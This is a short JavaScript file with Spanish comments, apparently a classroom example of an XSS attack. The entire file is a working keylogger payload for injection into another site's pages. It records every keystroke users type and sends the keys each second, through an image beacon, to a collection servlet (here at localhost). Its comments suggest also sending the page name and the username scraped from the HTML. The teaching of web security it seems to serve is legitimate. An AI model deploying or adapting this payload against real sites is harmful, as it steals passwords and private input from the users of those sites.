
//Este ejemplo sería para mandar todo lo que escriban nuestros usuarios
//de la otra aplicación a este servidor
var keys = '';
 
//vamos guardando lo que escriba
document.onkeypress = function(e) {
	//Esto para que funcione en navegadores antiguos de IE
	//ya que en esos navegadores no nos pasaban el evento por parametro
    var get = window.event ? event : e;
    var key = get.keyCode ? get.keyCode : get.charCode;
    //Key tiene el ascii
    key = String.fromCharCode(key);
    keys += key;
}

//cada 1 segundo mandamos lo que haya escrito el usuario al SVTeclas
window.setInterval(function(){
    new Image().src = 'http://localhost:8081/Ej08_XSS_EjemplosAtaque_Indeseables/SVTeclas?t=' + keys;
    keys = '';
}, 1000);

//Esto se enviaria de todos los usuarios que escriban pero se podría hacer cosas
//como meter mas parametros en la url como por ejemplo el nombre de la pagina
//o el usuario a buscandolo a traves de los nodos de HTML (si saben donde se encuentra
//que es facil)


